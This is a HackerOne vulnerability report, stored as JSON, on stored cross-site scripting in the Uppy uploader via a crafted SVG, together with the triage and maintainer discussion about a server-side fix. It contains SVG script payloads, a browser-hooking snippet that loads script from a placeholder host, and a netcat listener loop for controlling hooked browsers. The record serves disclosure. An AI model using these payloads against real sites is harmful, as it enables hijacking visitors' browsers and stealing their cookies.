{"id":311998,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTE5OTg=","url":"https://hackerone.com/reports/311998","title":"[uppy] Stored XSS due to crafted SVG file","state":"Closed","substate":"informative","severity_rating":"medium","readable_substate":"Informative","created_at":"2018-02-03T20:55:04.073Z","submitted_at":"2018-02-03T20:55:04.073Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"alyssa_herrera","url":"/alyssa_herrera","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-03-01T19:11:29.110Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-03-01T19:11:21.626Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\n\n**Module:** \n[Uppy](https://www.npmjs.com/package/uppy/ \"Uppy\").\n Affected version: 0.22.2 (current build)\n**Summary:** Uppy is a modular file uploader for node js . Due to insecure handling of SVG image files, an attacker could upload a crafted SVG file and perform a stored XSS with Dom access. SVG can use JavaScript in them and still be treated as images by the website, special care is needed to be taken with SVG files to prevent stored xss.\n\n**Description:** We can create a svg file with the following code. \n```\u003c?xml version=\"1.0\" standalone=\"no\"?\u003e\n\u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e\u003csvg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\n   \u003cpolygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/\u003e\n   \u003cscript type=\"text/javascript\"\u003e\n      alert(document.location);\n   \u003c/script\u003e\n\u003c/svg\u003e```\nThen save as svg and upload to our application then click to visit the page. We can create an alert box with access to Dom enabling cooking theft or other forms of attacks such as serving malicious software.\n\n## Steps To Reproduce:\nI used [the sample code for their dashboard](https://uppy.io/examples/dashboard// \"With a Title\") to test this proof of concept on my own server. We go to our dashboard and click file from our computer then select our crafted SVG file then click the upload. Then click our SVG file to be taken to where it was uploaded and receive an alert box with the web page's location.\n\n## Impact: An adversary can leverage this vulnerability to enable a persistent java script execution on the web page which can then lead to performing malicious actions without user knowledge.\n\n## Impact\n\nAn adversary can leverage this vulnerability to hook user's browsers and send java script commands to it interactively thus leading to further compromise of the user or users who visit this webpage . An example of this would being using ```setInterval(function(){with(document)body.\nappendChild(createElement('script')).src='//HOST:5855'},100)```\nThen setting a listener on our host unix host with the following command, ```while :; do printf \"j$ \"; read c; echo $c | nc -lp 5855 \u003e/dev/null; done``","vulnerability_information_html":"\u003cblockquote\u003e\n\u003cp\u003eNOTE! Thanks for submitting a report! Please replace \u003cem\u003eall\u003c/em\u003e the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e\u003cstrong\u003eModule:\u003c/strong\u003e \u003cbr\u003e\n\u003ca title=\"Uppy\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fuppy%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eUppy\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\n Affected version: 0.22.2 (current build)\u003cbr\u003e\n\u003cstrong\u003eSummary:\u003c/strong\u003e Uppy is a modular file uploader for node js . Due to insecure handling of SVG image files, an attacker could upload a crafted SVG file and perform a stored XSS with Dom access. SVG can use JavaScript in them and still be treated as images by the website, special care is needed to be taken with SVG files to prevent stored xss.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e We can create a svg file with the following code. \u003cbr\u003e\n\u003ccode\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; standalone=\u0026quot;no\u0026quot;?\u0026gt;\u003cbr\u003e\n\u0026lt;!DOCTYPE svg PUBLIC \u0026quot;-//W3C//DTD SVG 1.1//EN\u0026quot; \u0026quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\u0026quot;\u0026gt;\u0026lt;svg version=\u0026quot;1.1\u0026quot; baseProfile=\u0026quot;full\u0026quot; xmlns=\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u0026gt;\u003cbr\u003e\n   \u0026lt;polygon id=\u0026quot;triangle\u0026quot; points=\u0026quot;0,0 0,50 50,0\u0026quot; fill=\u0026quot;#009900\u0026quot; stroke=\u0026quot;#004400\u0026quot;/\u0026gt;\u003cbr\u003e\n   \u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt;\u003cbr\u003e\n      alert(document.location);\u003cbr\u003e\n   \u0026lt;/script\u0026gt;\u003cbr\u003e\n\u0026lt;/svg\u0026gt;\u003c/code\u003e\u003cbr\u003e\nThen save as svg and upload to our application then click to visit the page. We can create an alert box with access to Dom enabling cooking theft or other forms of attacks such as serving malicious software.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eI used \u003ca title=\"With a Title\" href=\"/redirect?url=https%3A%2F%2Fuppy.io%2Fexamples%2Fdashboard%2F%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethe sample code for their dashboard\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to test this proof of concept on my own server. We go to our dashboard and click file from our computer then select our crafted SVG file then click the upload. Then click our SVG file to be taken to where it was uploaded and receive an alert box with the web page\u0026#39;s location.\u003c/p\u003e\n\n\u003ch2 id=\"impact-an-adversary-can-leverage-this-vulnerability-to-enable-a-persistent-java-script-execution-on-the-web-page-which-can-then-lead-to-performing-malicious-actions-without-user-knowledge\"\u003eImpact: An adversary can leverage this vulnerability to enable a persistent java script execution on the web page which can then lead to performing malicious actions without user knowledge.\u003c/h2\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn adversary can leverage this vulnerability to hook user\u0026#39;s browsers and send java script commands to it interactively thus leading to further compromise of the user or users who visit this webpage . An example of this would being using \u003ccode\u003esetInterval(function(){with(document)body.\u003cbr\u003e\nappendChild(createElement(\u0026#39;script\u0026#39;)).src=\u0026#39;//HOST:5855\u0026#39;},100)\u003c/code\u003e\u003cbr\u003e\nThen setting a listener on our host unix host with the following command, `\u003ccode\u003ewhile :; do printf \u0026quot;j$ \u0026quot;; read c; echo $c | nc -lp 5855 \u0026gt;/dev/null; done\u003c/code\u003e\u003c/p\u003e\n","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":259977,"file_name":"SVG_XSS.svg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/259/977/4c35ffec4068cd1f22e9835245ad43985fb1f6fe/SVG_XSS.svg?response-content-disposition=attachment%3B%20filename%3D%22SVG_XSS.svg%22%3B%20filename%2A%3DUTF-8%27%27SVG_XSS.svg\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053225Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=96af3fb08643c91c4d59b2522f71c233b4c84339ee857aa89e245741838928ab","file_size":381,"type":"image/svg+xml"}],"allow_singular_disclosure_at":null,"vote_count":6,"voters":["bl4de","alyssa_herrera","apapedulimu","666reda","ozzyoz","iyerboy"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":50499,"asset_type":"SOURCE_CODE","asset_identifier":"Uppy","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2348332,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-03T20:56:47.381Z","updated_at":"2018-02-03T20:56:47.381Z","additional_data":{"old_title":"[uppy] Stored Xss due to crafted SVG file","new_title":"[uppy] Stored XSS due to crafted SVG file"},"actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2348473,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @alyssa_herrera , \n\nThanks a lot for reporting this to us.\nA member of the team will look at your report and triage it shortly!\n\nCan you please provide a clear reproducing steps which we can follow?","markdown_message":"\u003cp\u003eHi @alyssa_herrera , \u003c/p\u003e\n\n\u003cp\u003eThanks a lot for reporting this to us.\u003cbr\u003e\nA member of the team will look at your report and triage it shortly!\u003c/p\u003e\n\n\u003cp\u003eCan you please provide a clear reproducing steps which we can follow?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-03T23:22:45.241Z","updated_at":"2018-02-03T23:22:45.241Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2348510,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"How I recreated it was git cloning https://github.com/transloadit/uppy  then cd into the uppy directory. Then npm install then npm start and the followed npm run dev. Then navigate to http://server-ip:3452 then click upload and upload our svg. Although if you do not modify the location of where the file is upload, it will install the demo website of the maintainers.","markdown_message":"\u003cp\u003eHow I recreated it was git cloning \u003ca title=\"https://github.com/transloadit/uppy\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ftransloadit%2Fuppy\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/transloadit/uppy\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e  then cd into the uppy directory. Then npm install then npm start and the followed npm run dev. Then navigate to \u003ca title=\"http://server-ip:3452\" href=\"/redirect?url=http%3A%2F%2Fserver-ip%3A3452\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://server-ip:3452\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e then click upload and upload our svg. Although if you do not modify the location of where the file is upload, it will install the demo website of the maintainers.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-04T00:57:14.662Z","updated_at":"2018-02-04T01:02:31.381Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2348519,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For my last comment I meant, I did realize that if you upload your svg file, it will upload to the mantainer's website rather than your own. ","markdown_message":"\u003cp\u003eFor my last comment I meant, I did realize that if you upload your svg file, it will upload to the mantainer\u0026#39;s website rather than your own. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-04T01:16:19.579Z","updated_at":"2018-02-04T01:16:19.579Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2349190,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As the demo app is configured for their website and would be another indication of the vulnerability in the uppy core it self due to proper checks for what is an image file and the contents it might contain.","markdown_message":"\u003cp\u003eAs the demo app is configured for their website and would be another indication of the vulnerability in the uppy core it self due to proper checks for what is an image file and the contents it might contain.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-04T10:23:46.147Z","updated_at":"2018-02-04T10:23:46.147Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2349276,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"A simple check for svg files and disallowing them uploaded, or converting svg files into an image though there might be more elegant solution to solving this issue ","markdown_message":"\u003cp\u003eA simple check for svg files and disallowing them uploaded, or converting svg files into an image though there might be more elegant solution to solving this issue \u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-04T12:12:10.628Z","updated_at":"2018-02-04T12:12:10.628Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2350431,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@alyssa_herrera how would I reproduce it without uploading it to the maintainer's website? that's a very intrusive action to take. I did manage to get node-tus-server running locally to upload the file but would be ideal in the future to include a more detailed reproduce steps, and definitely not test on a system you don't own.\n\nAppreciate the report.\nI will invite the maintainer to the conversation.","markdown_message":"\u003cp\u003e\u003ca href=\"/alyssa_herrera\"\u003e@alyssa_herrera\u003c/a\u003e how would I reproduce it without uploading it to the maintainer\u0026#39;s website? that\u0026#39;s a very intrusive action to take. I did manage to get node-tus-server running locally to upload the file but would be ideal in the future to include a more detailed reproduce steps, and definitely not test on a system you don\u0026#39;t own.\u003c/p\u003e\n\n\u003cp\u003eAppreciate the report.\u003cbr\u003e\nI will invite the maintainer to the conversation.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-04T19:45:11.969Z","updated_at":"2018-02-04T19:45:11.969Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2350433,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-04T19:45:28.601Z","updated_at":"2018-02-04T19:45:28.601Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2350498,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the advice, I'll make a note of it to ensure I do test systems that aren't mine, glad I can help regardless.","markdown_message":"\u003cp\u003eThank you for the advice, I\u0026#39;ll make a note of it to ensure I do test systems that aren\u0026#39;t mine, glad I can help regardless.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-04T20:38:09.073Z","updated_at":"2018-02-04T20:38:09.073Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2392991,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey I noticed on their github  they were discussing a patch. I noticed that certain svg files will result in this \"\u003csvg\u003e\u003cforeignObject\u003e\u003c![CDATA[\u003c/foreignObject\u003e\u003cscript\u003ealert(2)\u003c/script\u003e]]\u003e\u003c/svg\u003e\" though my original payload which hides it in a legitimate image file is still working as provided in my PoC","markdown_message":"\u003cp\u003eHey I noticed on their github  they were discussing a patch. I noticed that certain svg files will result in this \u0026quot;\u0026lt;svg\u0026gt;\u0026lt;foreignObject\u0026gt;\u0026lt;![CDATA[\u0026lt;/foreignObject\u0026gt;\u0026lt;script\u0026gt;alert(2)\u0026lt;/script\u0026gt;]]\u0026gt;\u0026lt;/svg\u0026gt;\u0026quot; though my original payload which hides it in a legitimate image file is still working as provided in my PoC\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-17T00:48:01.414Z","updated_at":"2018-02-17T00:48:01.414Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2440543,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-27T21:45:35.335Z","updated_at":"2018-02-27T21:45:35.335Z","actor":{"username":"arturi","cleared":false,"url":"/arturi","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2440549,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, @alyssa_herrera, thanks for finding and reporting!\n\nThe issue seems to be not with Uppy itself, but with the tusd server endpoint where the upload is going to. So the malicious SVG you provided, once uploaded (by anything), could be accessed in the browser publicly via a url. We’ve fixed that on the server in https://github.com/tus/tusd/commit/6230c23566adaff4b74ce4ec9b572dba39adc569. Now files are not displayed, but downloaded instead.\n\nCan you still reproduce the issue somehow on https://uppy.io/examples/dashboard/? Or are you using something else?\n\nThanks,\nArtur","markdown_message":"\u003cp\u003eHi, \u003ca href=\"/alyssa_herrera\"\u003e@alyssa_herrera\u003c/a\u003e, thanks for finding and reporting!\u003c/p\u003e\n\n\u003cp\u003eThe issue seems to be not with Uppy itself, but with the tusd server endpoint where the upload is going to. So the malicious SVG you provided, once uploaded (by anything), could be accessed in the browser publicly via a url. We’ve fixed that on the server in \u003ca title=\"https://github.com/tus/tusd/commit/6230c23566adaff4b74ce4ec9b572dba39adc569\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ftus%2Ftusd%2Fcommit%2F6230c23566adaff4b74ce4ec9b572dba39adc569\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/tus/tusd/commit/6230c23566adaff4b74ce4ec9b572dba39adc569\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Now files are not displayed, but downloaded instead.\u003c/p\u003e\n\n\u003cp\u003eCan you still reproduce the issue somehow on \u003ca title=\"https://uppy.io/examples/dashboard/\" href=\"/redirect?url=https%3A%2F%2Fuppy.io%2Fexamples%2Fdashboard%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://uppy.io/examples/dashboard/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e? Or are you using something else?\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nArtur\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T21:51:13.298Z","updated_at":"2018-02-27T21:51:13.298Z","actor":{"username":"arturi","cleared":false,"url":"/arturi","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2440592,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm no longer able to reproduce it, I was testing it in between those patches you mentioned over on github.","markdown_message":"\u003cp\u003eI\u0026#39;m no longer able to reproduce it, I was testing it in between those patches you mentioned over on github.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T22:08:00.163Z","updated_at":"2018-02-27T22:08:00.163Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2440594,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you! As far as I understand, there’s nothing more we can do on the client side, besides warning about this in docs maybe.","markdown_message":"\u003cp\u003eThank you! As far as I understand, there’s nothing more we can do on the client side, besides warning about this in docs maybe.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T22:09:35.004Z","updated_at":"2018-02-27T22:09:35.004Z","actor":{"username":"arturi","cleared":false,"url":"/arturi","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2440598,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah it's best to mention it to users as well. ","markdown_message":"\u003cp\u003eYeah it\u0026#39;s best to mention it to users as well. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T22:10:55.327Z","updated_at":"2018-02-27T22:10:55.327Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2440600,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"So this doesn't seem to affect uppy then, right?\nIf so I'll resolve the report and publicly disclose if it's ok with you both.","markdown_message":"\u003cp\u003eSo this doesn\u0026#39;t seem to affect uppy then, right?\u003cbr\u003e\nIf so I\u0026#39;ll resolve the report and publicly disclose if it\u0026#39;s ok with you both.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T22:11:41.362Z","updated_at":"2018-02-27T22:11:41.362Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2440607,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That sounds perfectly fine for me.","markdown_message":"\u003cp\u003eThat sounds perfectly fine for me.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T22:12:41.625Z","updated_at":"2018-02-27T22:12:41.625Z","actor":{"username":"alyssa_herrera","cleared":true,"url":"/alyssa_herrera","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PGiKyhRYWCkCp45rkdBZUAvL/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2440609,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is it ok for us to mention Alyssa and/or use the SVG you provided if we want to mention in docs or GitHub?","markdown_message":"\u003cp\u003eIs it ok for us to mention Alyssa and/or use the SVG you provided if we want to mention in docs or 